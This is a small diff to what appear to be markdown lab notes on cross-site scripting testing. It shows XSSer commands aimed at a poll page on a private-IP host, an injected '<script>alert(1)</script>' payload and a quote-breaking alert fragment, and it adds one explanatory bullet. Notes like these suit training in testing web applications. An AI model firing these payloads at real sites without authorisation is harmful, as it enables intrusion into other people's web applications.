@@ -59,6 +59,4 @@ a';alert(888);'
 - GET
   - ```xsser --url "http://192.94.37.3/index.php?page=user-poll.php&csrf-token=&choice=XSS&initials=jd&user-poll-php-submit-button=Submit+Vote"```
   - ```xsser --url "http://192.94.37.3/index.php?page=user-poll.php&csrf-token=&choice=XSS&initials=jd&user-poll-php-submit-button=Submit+Vote" --Fp "<script>alert(1)</script>"```
- 
- 
- - 
+    - Providing basic XSS payload to XSSer
